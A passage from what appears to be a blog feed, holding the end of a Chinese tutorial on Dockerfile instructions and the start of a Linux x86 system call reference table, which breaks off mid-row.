class="line"><span class="keyword">USER</span> <span class="number">1001</span></span><br></pre></td></tr></table></figure></div><blockquote><p>默认用户是root</p></blockquote><h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>用于定义临时变量，例如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span>  CODE_VERSION=latest</span><br><span class="line"><span class="keyword">FROM</span> base:$&#123;CODE_VERSION&#125;</span><br></pre></td></tr></table></figure></div><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><p>设置环境变量，有两种格式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENV</span> &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="keyword">ENV</span> &lt;key&gt;=&lt;value&gt; ...</span><br></pre></td></tr></table></figure></div><blockquote><p>使用等于号可以同时设置多个环境变量</p></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>从本地复制文件到镜像，格式为<code>COPY 本地文件 目标镜像文件</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> <span class="built_in">test</span> relativeDir/   <span class="comment"># adds "test" to `WORKDIR`/relativeDir/</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> <span class="built_in">test</span> /absoluteDir/  <span class="comment"># adds "test" to /absoluteDir/</span></span></span><br></pre></td></tr></table></figure></div><blockquote><p>拷贝时可以使用相对路径，前提是已经通过<code>WORKDIR</code>指定了工作目录</p></blockquote><p>COPY的同时修改文件所有者：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span><span class="bash"> --chown=user:group files* /somedir/</span></span><br></pre></td></tr></table></figure></div><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN就是执行系统命令，有两种格式：</p><ul><li><p><code>RUN &lt;command&gt;</code> (<em>shell</em> 格式)</p></li><li><p><code>RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]</code> (<em>exec</em> 格式)</p></li></ul><blockquote><p> <em>shell</em>格式相当于把<code>RUN</code>后的<code>command</code>依次作为<code>/bin/sh -c</code>的参数（子命令）</p><p><em>exec</em>格式则是直接执行括号中的命令</p></blockquote><blockquote><p><em>exec</em> 格式使用的是<code>JSON</code>数组，所以只能用双引号，不能用单引号！</p></blockquote><p>一般使用第一种，例子：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br></pre></td></tr></table></figure></div><blockquote><p>执行命令的默认用户是root</p></blockquote><p>第二种格式很麻烦，因为它不会调用shell，所以环境变量什么的就不会起作用，比如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> [ <span class="string">"echo"</span>, <span class="string">"<span class="variable">$HOME</span>"</span> ]</span></span><br></pre></td></tr></table></figure></div><p>上面的用法是错的，正确的用法应该是：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> [ <span class="string">"sh"</span>, <span class="string">"-c"</span>, <span class="string">"echo <span class="variable">$HOME</span>"</span> ]</span></span><br></pre></td></tr></table></figure></div><blockquote><p>很麻烦是叭 _(:з」∠)</p></blockquote><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>配置曝露的端口</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> &lt;port&gt; [&lt;port&gt;/&lt;protocol&gt;...]</span><br></pre></td></tr></table></figure></div><p>例如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span>/tcp</span><br></pre></td></tr></table></figure></div><blockquote><p>曝露的端口用于在docker启动时作端口映射，比如将docker的<code>80</code>端口映射到服务器的<code>8080</code>端口：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80/tcp ...</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>有三种写法：</p><ul><li><p><code>CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]</code> (<em>exec</em> 格式)</p></li><li><p><code>CMD [&quot;param1&quot;,&quot;param2&quot;]</code> (用作<a href="#ENTRYPOINT"><em>ENTRYPOINT</em></a>的参数)</p></li><li><p><code>CMD command param1 param2</code> (<em>shell</em> 格式)</p></li></ul><p>CMD指定的<strong>命令/脚本</strong>会在镜像启动时执行，是可执行容器默认的执行命令。</p><blockquote><p>一个Dockerfile中只能有一个CMD指令，如果存在多个，则只有最后一个生效</p></blockquote><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h3><p>镜像启动后的入口点。</p><p>和CMD不同，ENTRYPOINT先执行。</p><p>比如ENTRYPOINT指定了一个启动脚本：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"entrypoint.sh"</span>]</span></span><br></pre></td></tr></table></figure></div><p>在镜像启动后，只会执行这个脚本的内容（即使<code>Dockerfile</code>中有CMD指令）。</p><p>但是CMD指令也是有用处的，比如这样：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"2333"</span>]</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"echo"</span>]</span></span><br></pre></td></tr></table></figure></div><p>运行镜像的结果是：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2333</span><br></pre></td></tr></table></figure></div><p>也就是说，如果之前有CMD指令，CMD指令的操作数其实是用作ENTRYPOINT的参数的。</p><blockquote><p>如果不指定ENTRYPOINT，CMD的操作数就会被全部用作ENTRYPOINT的参数<br>所以看起来的效果就是默认执行了CMD</p></blockquote><p>感觉没说明白……文章末尾有<a href="#Ref">参考文章</a>，讲的十分清楚(´•灬•‘) </p><h3 id="LABLE"><a href="#LABLE" class="headerlink" title="LABLE"></a>LABLE</h3><p>给镜像添加标签（没啥用）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LABEL</span><span class="bash"> version=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> description=<span class="string">"This text illustrates \</span></span></span><br><span class="line"><span class="bash">that label-values can span multiple lines.<span class="string">"</span></span></span><br></pre></td></tr></table></figure></div><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>和<code>COPY</code>差不多，但貌似只能在Linux下用，不提了。</p><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>用于创建镜像内的挂载点，例如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">dockerfile</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/data"</span>]</span></span><br></pre></td></tr></table></figure></div><blockquote><p>感觉没啥用，一般操作是在<code>docker-compose</code>里直接设置挂载点的信息</p></blockquote><p>这篇先写到这里，<code>docker-compose</code>的用法<a href="http://taqini.space/2020/03/04/note-for-docker-2">下一篇</a>写。</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://docs.docker.com/engine/reference/builder/" target="_blank" rel="noopener">官方| Docker Documentation</a></p><p><a href="https://blog.csdn.net/u010900754/article/details/78526443" target="_blank" rel="noopener">CSDN|【docker】CMD ENTRYPOINT 区别 终极解读！</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> docker-compose </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux System Call Table</title>
      <link href="/2020/02/29/Linux-System-Call-Table/"/>
      <url>/2020/02/29/Linux-System-Call-Table/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-System-Call-Table-for-x86"><a href="#Linux-System-Call-Table-for-x86" class="headerlink" title="Linux System Call Table for x86"></a>Linux System Call Table for x86</h1><table><thead><tr><th>EAX</th><th>System call</th><th>EBX</th><th>ECX</th><th>EDX</th><th>ESI</th><th>EDI</th></tr></thead><tbody><tr><td>1</td><td>sys_exit</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>sys_fork</td><td>struct  pt_regs</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>sys_read</td><td>unsigned int</td><td>char *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td>4</td><td>sys_write</td><td>unsigned int</td><td>const char *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td>5</td><td>sys_open</td><td>const char *</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>6</td><td>sys_close</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>sys_waitpid</td><td>pid_t</td><td>unsigned int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>8</td><td>sys_creat</td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>sys_link</td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>sys_unlink</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>sys_execve</td><td>struct  pt_regs</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>sys_chdir</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>sys_time</td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>sys_mknod</td><td>const char *</td><td>int</td><td>dev_t</td><td>-</td><td>-</td></tr><tr><td>15</td><td>sys_chmod</td><td>const char *</td><td>mode_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>sys_lchown</td><td>const char *</td><td>uid_t</td><td>-</td><td>-</td><td></td></tr><tr><td>18</td><td>sys_stat</td><td>char *</td><td>struct  __old_kernel_stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>19</td><td>sys_lseek</td><td>unsigned int</td><td>off_t</td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>20</td><td>sys_getpid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>21</td><td>sys_mount</td><td>char *</td><td>char *</td><td>char *</td><td>-</td><td>-</td></tr><tr><td>22</td><td>sys_oldumount</td><td>char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>23</td><td>sys_setuid</td><td>uid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>24</td><td>sys_getuid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>25</td><td>sys_stime</td><td>int *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>26</td><td>sys_ptrace</td><td>long</td><td>long</td><td>long</td><td>long</td><td>-</td></tr><tr><td>27</td><td>sys_alarm</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>28</td><td>sys_fstat</td><td>unsigned int</td><td>struct  __old_kernel_stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>29</td><td>sys_pause</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>30</td><td>sys_utime</td><td>char *</td><td>struct  utimbuf *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>33</td><td>sys_access</td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>34</td><td>sys_nice</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>36</td><td>sys_sync</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>37</td><td>sys_kill</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>38</td><td>sys_rename</td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>39</td><td>sys_mkdir</td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>40</td><td>sys_rmdir</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>41</td><td>sys_dup</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>42</td><td>sys_pipe</td><td>unsigned long *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>43</td><td>sys_times</td><td>struct  tms *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>45</td><td>sys_brk</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>46</td><td>sys_setgid</td><td>gid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>47</td><td>sys_getgid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>48</td><td>sys_signal</td><td>int</td><td>__sighandler_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>49</td><td>sys_geteuid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>50</td><td>sys_getegid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>51</td><td>sys_acct</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>52</td><td>sys_umount</td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>54</td><td>sys_ioctl</td><td>unsigned int</td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>55</td><td>sys_fcntl</td><td>unsigned int</td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>57</td><td>sys_setpgid</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>59</td><td>sys_olduname</td><td>struct  oldold_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>60</td><td>sys_umask</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>61</td><td>sys_chroot</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>62</td><td>sys_ustat</td><td>dev_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>63</td><td>sys_dup2</td><td>unsigned int</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>64</td><td>sys_getppid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>65</td><td>sys_getpgrp</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>66</td><td>sys_setsid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>67</td><td>sys_sigaction</td><td>int</td><td>const struct  old_sigaction *</td><td>-</td><td>-</td><td></td></tr><tr><td>68</td><td>sys_sgetmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>69</td><td>sys_ssetmask</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>70</td><td>sys_setreuid</td><td>uid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>71</td><td>sys_setregid</td><td>gid_t</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>72</td><td>sys_sigsuspend</td><td>int</td><td>int</td><td>old_sigset_t</td><td>-</td><td>-</td></tr><tr><td>73</td><td>sys_sigpending</td><td>old_sigset_t  *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>74</td><td>sys_sethostname</td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>75</td><td>sys_setrlimit</td><td>unsigned int</td><td>struct  rlimit *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>76</td><td>sys_getrlimit</td><td>unsigned int</td><td>struct  rlimit *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>77</td><td>sys_getrusage</td><td>int</td><td>struct  rusage *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>78</td><td>sys_gettimeofday</td><td>struct  timeval *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>79</td><td>sys_settimeofday</td><td>struct  timeval *</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>80</td><td>sys_getgroups</td><td>int</td><td>gid_t  *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>81</td><td>sys_setgroups</td><td>int</td><td>gid_t  *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>82</td><td>old_select</td><td>struct  sel_arg_struct *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>83</td><td>sys_symlink</td><td>const char *</td><td>const char *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>84</td><td>sys_lstat</td><td>char *</td><td>struct  __old_kernel_stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>85</td><td>sys_readlink</td><td>const char *</td><td>char *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>86</td><td>sys_uselib</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>87</td><td>sys_swapon</td><td>const char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>88</td><td>sys_reboot</td><td>int</td><td>int</td><td>int</td><td>void *</td><td>-</td></tr><tr><td>89</td><td>old_readdir</td><td>unsigned int</td><td>void *</td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>90</td><td>old_mmap</td><td>struct  mmap_arg_struct *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>91</td><td>sys_munmap</td><td>unsigned long</td><td>size_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>92</td><td>sys_truncate</td><td>const char *</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>93</td><td>sys_ftruncate</td><td>unsigned int</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>94</td><td>sys_fchmod</td><td>unsigned int</td><td>mode_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>95</td><td>sys_fchown</td><td>unsigned int</td><td>uid_t</td><td>-</td><td>-</td><td></td></tr><tr><td>96</td><td>sys_getpriority</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>97</td><td>sys_setpriority</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td></tr><tr><td>99</td><td>sys_statfs</td><td>const char *</td><td>struct  statfs *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>100</td><td>sys_fstatfs</td><td>unsigned int</td><td>struct  statfs *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>101</td><td>sys_ioperm</td><td>unsigned long</td><td>unsigned long</td><td>int</td><td>-</td><td>-</td></tr><tr><td>102</td><td>sys_socketcall</td><td>int</td><td>unsigned long *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>103</td><td>sys_syslog</td><td>int</td><td>char *</td><td>int</td><td>-</td><td>-</td></tr><tr><td>104</td><td>sys_setitimer</td><td>int</td><td>struct  itimerval *</td><td>-</td><td>-</td><td></td></tr><tr><td>105</td><td>sys_getitimer</td><td>int</td><td>struct  itimerval *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>106</td><td>sys_newstat</td><td>char *</td><td>struct  stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>107</td><td>sys_newlstat</td><td>char *</td><td>struct  stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>108</td><td>sys_newfstat</td><td>unsigned int</td><td>struct  stat *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>109</td><td>sys_uname</td><td>struct  old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>110</td><td>sys_iopl</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>111</td><td>sys_vhangup</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>112</td><td>sys_idle</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>113</td><td>sys_vm86old</td><td>unsigned long</td><td>struct  vm86plus_struct *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>114</td><td>sys_wait4</td><td>pid_t</td><td>-</td><td></td><td></td><td></td></tr><tr><td>115</td><td>sys_swapoff</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>116</td><td>sys_sysinfo</td><td>struct  sysinfo *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>117</td><td>sys_ipc (*Note)</td><td>int</td><td>int</td><td>int</td><td>void *</td><td></td></tr><tr><td>118</td><td>sys_fsync</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>119</td><td>sys_sigreturn</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>120</td><td>sys_clone</td><td>struct  pt_regs</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>121</td><td>sys_setdomainname</td><td>char *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>122</td><td>sys_newuname</td><td>struct  new_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>123</td><td>sys_modify_ldt</td><td>int</td><td>void *</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>124</td><td>sys_adjtimex</td><td>struct  timex *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>125</td><td>sys_mprotect</td><td>unsigned long</td><td>size_t</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>126</td><td>sys_sigprocmask</td><td>int</td><td>old_sigset_t  *</td><td>-</td><td>-</td><td></td></tr><tr><td>127</td><td>sys_create_module</td><td>const char *</td><td>size_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>128</td><td>sys_init_module</td><td>const char *</td><td>struct  module *</td><td>-</td><td>-</td><td>-</td></tr><tr><td>129</td><td>sys_delete_module</td><td>const char *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>130</td><td>sys_get_kernel_syms</td><td>struct  kernel_sym *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>131</td><td>sys_quotactl</td><td>int</td><td>const char *</td><td>int</td><td>caddr_t</td><td>-</td></tr><tr><td>132</td><td>sys_getpgid</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>133</td><td>sys_fchdir</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>134</td><td>sys_bdflush</td><td>int</td><td>long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>135</td><td>sys_sysfs</td><td>int</td><td>unsigned long</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>136</td><td>sys_personality</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>138</td><td>sys_setfsuid</td><td>uid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>139</td><td>sys_setfsgid</td><td>gid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>140</td><td>sys_llseek</td><td>unsigned int</td><td>unsigned long</td><td>unsigned long</td><td>loff_t  *</td><td>unsigned int</td></tr><tr><td>141</td><td>sys_getdents</td><td>unsigned int</td><td>void *</td><td>unsigned int</td><td>-</td><td>-</td></tr><tr><td>142</td><td>sys_select</td><td>int</td><td>fd_set  *</td><td></td><td></td><td></td></tr><tr><td>143</td><td>sys_flock</td><td>unsigned int</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td></tr><tr><td>144</td><td>sys_msync</td><td>unsigned long</td><td>size_t</td><td>int</td><td>-</td><td>-</td></tr><tr><td>145</td><td>sys_readv</td><td>unsigned long</td><td>const  struct iovec *</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>146</td><td>sys_writev</td><td>unsigned long</td><td>const  struct iovec *</td><td>unsigned long</td><td>-</td><td>-</td></tr><tr><td>147</td><td>sys_getsid</td><td>pid_t</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>148</td><td>sys_fdatasync</td><td>unsigned int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>149</td><td>sys_sysctl</td><td>struct  __sysctl_args *</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>150</td><td>sys_mlock</td><td>unsigned long</td><td>size_t</td><td>-</td><td>-</td><td>-</td></tr><tr><td>151</td><td>sys_munlock</td><td>unsigned 